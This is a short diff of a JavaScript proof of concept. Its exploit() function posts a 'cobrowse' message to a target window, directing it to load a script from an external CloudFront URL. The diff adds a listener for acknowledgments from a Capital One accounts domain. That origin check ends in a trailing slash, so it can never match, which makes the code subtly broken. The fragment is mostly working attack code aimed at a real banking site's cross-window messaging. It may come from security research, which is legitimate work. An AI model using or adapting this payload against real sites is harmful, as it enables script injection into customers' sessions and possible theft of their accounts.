@@ -19,7 +19,16 @@ function exploit()
         target.postMessage('{"_name":"cobrowse", "_data":{"url":"https://d1af033869koo7.cloudfront.net/psp/united-v1-001/247px.js"}}',"*");
         
     },5000);
-    
+
+window.addEventListener("message", (event) => {
+    if (event.origin !== "https://myaccounts.capitalone.com/") {
+        console.warn("Response from untrusted origin:", event.origin);
+        return;
+    }
+
+    console.log("Acknowledgment from target domain:", event.data);
+});
+
    
 
 }
